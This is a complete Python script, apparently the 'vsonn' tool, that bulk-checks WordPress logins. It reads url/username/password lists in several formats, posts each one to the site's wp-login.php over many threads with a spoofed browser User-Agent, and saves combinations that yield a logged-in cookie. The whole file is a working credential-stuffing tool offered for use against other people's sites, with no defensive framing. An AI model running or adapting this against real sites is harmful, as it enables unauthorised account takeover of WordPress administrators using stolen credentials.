import requests
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from functools import partial

try:
    from colorama import Fore, Style, init
except ImportError:
    print("Whoops, the 'colorama' library isn't installed. The output will look plain.")
    print("You can install it by typing: pip install colorama")
    class DummyFore:
        def __getattr__(self, name):
            return ""
    class DummyStyle:
        def __getattr__(self, name):
            return ""
    Fore = DummyFore()
    Style = DummyStyle()

init(autoreset=True)

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.CYAN}  __      __   _____   ____   _   _   _   _ 
{Fore.CYAN}  \ \    / /  / ____| / __ \ | \ | | | \ | |
{Fore.CYAN}   \ \  / /  | (___  | |  | ||  \| | |  \| |
{Fore.CYAN}    \ \/ /    \___ \ | |  | || . ` | | . ` |
{Fore.CYAN}     \  /     ____) || |__| || |\  | | |\  |
{Fore.CYAN}      \/     |_____/  \____/ |_| \_| |_| \_|
{Fore.WHITE}          https://github.com/FluppyZH/vsonn
{Style.RESET_ALL}
    """
    print(banner)
    print(f"{Fore.YELLOW}========================================================")
    print(f"{Fore.YELLOW}  don't forget stars:) ")
    print(f"{Fore.YELLOW}========================================================\n")

def get_format_choice():
    print(f"{Fore.CYAN}Choose the format of your list file:")
    print(f"{Fore.WHITE}1. url#username@password")
    print(f"{Fore.WHITE}2. url;username;password")
    print(f"{Fore.WHITE}3. url:username:password")
    print(f"{Fore.WHITE}4. Custom (Define your own separators)")
    
    choice = input(f"\n{Fore.CYAN}Your choice (1-4): {Style.RESET_ALL}")
    
    delim_type, delim1, delim2 = None, None, None
    
    if choice == '1':
        delim_type, delim1, delim2 = 'double', '#', '@'
    elif choice == '2':
        delim_type, delim1 = 'single', ';'
    elif choice == '3':
        delim_type, delim1 = 'single', ':'
    elif choice == '4':
        print(f"\n{Fore.YELLOW}Custom Mode Selected.{Style.RESET_ALL}")
        delim1 = input(f"{Fore.WHITE}Enter separator between URL and User: {Style.RESET_ALL}")
        delim2 = input(f"{Fore.WHITE}Enter separator between User and Pass: {Style.RESET_ALL}")
        delim_type = 'double'
    else:
        print(f"{Fore.RED}Invalid choice. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
        
    print(f"{Fore.GREEN}selected..{Style.RESET_ALL}\n")
    return delim_type, delim1, delim2

def check_login(line, delim_type, delim1, delim2=None):
    line = line.strip()
    if not line or line.startswith('#'):
        return None

    try:
        if delim_type == 'single':
            url_part, username, password = line.split(delim1, 2)
        elif delim_type == 'double':
            url_part, creds_part = line.split(delim1, 1)
            username, password = creds_part.split(delim2, 1)
        else:
            return None
    except ValueError:
        print(f"{Fore.YELLOW}[INFO]     Weird format or doesn't match choice, skipping: {line}{Style.RESET_ALL}")
        return None

    target_url = url_part.rstrip('/') + "/wp-login.php"
    
    session = requests.Session()
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': url_part.rstrip('/') + '/wp-admin/',
        'testcookie': '1'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': target_url
    }

    try:
        session.post(target_url, data=payload, headers=headers, timeout=15, allow_redirects=True)
        login_success = any('wordpress_logged_in_' in cookie.name for cookie in session.cookies)

        if login_success:
            print(f"{Fore.GREEN}[VALID]     {url_part} | User: {username} | Pass: {password}{Style.RESET_ALL}")
            return {'status': 'success', 'line': line}
        else:
            print(f"{Fore.RED}[INVALID]   {url_part} | User: {username}{Style.RESET_ALL}")
            return {'status': 'failure', 'line': line}
            
    except requests.exceptions.RequestException:
        print(f"{Fore.MAGENTA}[ERROR]     Failed to connect to {url_part}. Maybe it's offline?{Style.RESET_ALL}")
        return {'status': 'error', 'line': line}

def main():
    print_banner()
    delim_type, delim1, delim2 = get_format_choice()
    list_file = input(f"{Fore.WHITE}Enter your list file name : {Style.RESET_ALL}")
    
    output_file = input(f"{Fore.WHITE}Output file name (default: valid.txt) : {Style.RESET_ALL}")
    if not output_file:
        output_file = 'valid.txt'

    try:
        threads_str = input(f"{Fore.WHITE}How many threads? (default: 10) : {Style.RESET_ALL}")
        threads = 10 if not threads_str else int(threads_str)
    except ValueError:
        print(f"{Fore.YELLOW}That's not a number, dude :) Using 10 threads by default.{Style.RESET_ALL}")
        threads = 10
    
    print(f"{Fore.YELLOW}--------------------------------------------------------\n{Style.RESET_ALL}")

    try:
        with open(list_file, 'r', encoding='utf-8') as f:
            lines = [line for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR]     Can't find that file. : {list_file}{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.CYAN}Alright, starting scan on {len(lines)} sites with {threads} threads...{Style.RESET_ALL}")

    worker = partial(check_login, delim_type=delim_type, delim1=delim1, delim2=delim2)

    valid_logins = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(worker, lines)

        for result in results:
            if result and result['status'] == 'success':
                valid_logins.append(result['line'])

    if valid_logins:
        print(f"\n{Fore.GREEN}Well Well Well Found {len(valid_logins)} valid logins. Saving them to {output_file}{Style.RESET_ALL}")
        with open(output_file, 'w', encoding='utf-8') as f:
            for line in valid_logins:
                f.write(line + '\n')
    else:
        print(f"\n{Fore.YELLOW}Lol Didn't find any valid logins.{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}All done.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
